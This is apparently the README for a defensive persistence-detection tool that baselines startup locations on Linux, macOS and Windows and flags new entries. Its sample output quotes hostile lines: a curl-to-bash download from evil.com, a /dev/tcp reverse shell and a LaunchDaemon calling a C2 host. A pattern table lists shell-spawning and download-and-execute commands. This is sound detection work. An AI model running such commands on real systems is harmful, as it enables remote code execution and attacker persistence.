# 105 - Auto Start Extension Detector

**Purpose**: Persistence Detection - ASEP Baseline Comparison

**Description**: Detects new Auto Start Extension Points (ASEP) by maintaining a baseline of known startup entries and comparing against current system state. Performs suspicious content analysis on new entries to identify persistence mechanisms.

**Key Features**:
- ✅ Scans all ASEP locations (cron, systemd, LaunchAgents, rc files)
- ✅ Maintains JSON baseline file (~/.asep_baseline.json)
- ✅ Detects NEW entries (most dangerous indicator)
- ✅ Tracks REMOVED entries (monitoring for cleanup)
- ✅ UNCHANGED entry counting
- ✅ Suspicious content analysis (curl|bash, base64, reverse shells)
- ✅ User-writable location detection
- ✅ Binary/script type classification
- ✅ macOS LaunchAgent/Daemon parsing
- ✅ Severity classification (CRITICAL, HIGH, MEDIUM)
- ✅ JSON output for SIEM integration

**Real-world Application for Security Engineers**: 
Blue team analysts use this tool to catch persistence mechanisms added by attackers post-compromise. New entries in startup locations are among the most reliable indicators of breach, while content analysis identifies malicious scripts hidden in legitimate-looking filenames.

**Installation**:
```bash
# No external dependencies - uses os, json, glob from standard library
python3 auto_start_extension_detector.py --help
```

**Usage Examples**:

**1. Create Initial Baseline** (first run):
```bash
python3 auto_start_extension_detector.py --baseline
# Creates: ~/.asep_baseline.json with all current entries
# Output: [+] Baseline created: 79 entries
```

**2. Scan and Compare Against Baseline** (subsequent runs):
```bash
python3 auto_start_extension_detector.py
# Compares current system to baseline
# Reports: NEW entries, REMOVED entries, UNCHANGED entries
```

**3. Export Results as JSON**:
```bash
python3 auto_start_extension_detector.py --output asep_report.json
```

**4. Reset and Start Fresh**:
```bash
python3 auto_start_extension_detector.py --reset
# Deletes old baseline, prompts for new --baseline scan
```

**Output Format**:

**Console**:
```
[+] ASEP Scan Results

[!] NEW ENTRIES DETECTED: 3

    /etc/cron.d/malicious.sh
    Type: Script
    Severity: CRITICAL
    Reason: curl|bash pattern detected
    Content: curl http://evil.com/install.sh | bash
    
    ~/.bashrc (new line)
    Type: Script
    Severity: HIGH
    Reason: User-writable location + reverse shell pattern
    Content: /dev/tcp/192.168.1.100/4444
    
    /Library/LaunchDaemons/com.apple.malware.plist
    Type: LaunchDaemon (macOS)
    Severity: CRITICAL
    Reason: Suspicious arguments detected
    Arguments: ["/usr/bin/curl", "http://c2.example.com"]

[*] UNCHANGED: 76 entries
[*] REMOVED: 0 entries
```

**JSON Output** (--output asep_report.json):
```json
{
  "scan_time": "2026-04-30T10:15:00",
  "baseline_file": "/root/.asep_baseline.json",
  "summary": {
    "total_new": 3,
    "total_removed": 0,
    "total_unchanged": 76,
    "total_scanned": 79
  },
  "new_entries": [
    {
      "path": "/etc/cron.d/malicious.sh",
      "type": "script",
      "severity": "CRITICAL",
      "suspicious_patterns": ["curl|bash"],
      "content_preview": "curl http://evil.com/install.sh | bash",
      "location_type": "system"
    },
    {
      "path": "~/.bashrc",
      "type": "script",
      "severity": "HIGH",
      "suspicious_patterns": ["reverse_shell", "user_writable"],
      "content_preview": "/dev/tcp/192.168.1.100/4444",
      "location_type": "user"
    }
  ],
  "removed_entries": [],
  "unchanged_count": 76
}
```

**ASEP Locations Scanned**:

**Linux**:
- /etc/cron.d/ (system cron jobs)
- /etc/cron.daily/ (daily cron jobs)
- /etc/cron.hourly/ (hourly cron jobs)
- /etc/init.d/ (SysV init scripts)
- /etc/systemd/system/ (systemd services)
- /etc/profile.d/ (shell profile scripts)
- ~/.bashrc, ~/.bash_profile, ~/.profile, ~/.zshrc (shell RC files)
- ~/.config/autostart/ (application autostart)

**macOS**:
- /Library/LaunchAgents/ (user launch agents)
- /Library/LaunchDaemons/ (system launch daemons)
- ~/Library/LaunchAgents/ (user-specific launch agents)
- ~/.bashrc, ~/.zshrc (shell RC files)

**Windows** (when available):
- HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
- %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup

**Suspicious Content Patterns**:

| Pattern | Type | Risk |
|---------|------|------|
| `curl\|bash` | Command pipe to bash | CRITICAL |
| `wget\|sh` | Download and execute | CRITICAL |
| `/dev/tcp` | Reverse shell | CRITICAL |
| `base64` | Encoded commands | HIGH |
| `nc -e` | Netcat shell | CRITICAL |
| `bash -i` | Interactive shell | HIGH |
| `powershell -enc` | Encoded PowerShell | CRITICAL |

**Severity Classification**:

| Scenario | Severity |
|----------|----------|
| NEW + suspicious content | **CRITICAL** |
| NEW + user-writable location | **HIGH** |
| NEW + system location | **MEDIUM** |
| REMOVED (cleanup attempt) | **INFO** |
| UNCHANGED (baseline match) | **INFO** |

**Baseline Management**:

**Baseline File Location**: `~/.asep_baseline.json`

**Baseline Content**:
```json
{
  "created": "2026-04-30T09:00:00",
  "entries": [
    {
      "path": "/etc/cron.daily/apt",
      "hash": "abc123...",
      "type": "script",
      "size": 1024
    }
  ]
}
```

**Workflow**:

1. **Initial Setup**: Run with `--baseline` to create baseline
2. **Monitoring**: Run periodically (daily, weekly) to detect changes
3. **Investigation**: Review NEW entries for suspicious patterns
4. **Baseline Update**: After verifying new entry is legitimate, re-run --baseline to update
5. **Reset**: Use `--reset` if baseline becomes corrupted

**Integration Tips**:
- Combine with tool 096 (Process Monitor) for complete persistence analysis
- Use with tool 099 (Persistence Detector) for registry persistence
- Feed results into tool 104 (Behavior Report Generator) for incident reports
- Schedule with tool 107 (Task Runner) for continuous monitoring
- Integrate into SIEM via JSON for automated alerting

**Platform-Specific Behavior**:
- **Linux/macOS**: Full ASEP scanning with script content analysis
- **Windows**: Falls back to graceful message if registry tools unavailable
- All platforms: Cross-platform script files always scanned

**Performance Considerations**:
- Initial baseline: <2 seconds (one-time)
- Subsequent scans: <1 second (baseline comparison)
- Minimal disk I/O
- No external dependencies

**Baseline Maintenance**:
- Review baseline quarterly for stale entries
- Update baseline after approved system changes
- Keep baseline version control for forensics
- Don't share baseline across different systems

**Exit Codes**:
- `0` - Success (scan complete)
- `1` - Error (permission denied, invalid baseline, etc.)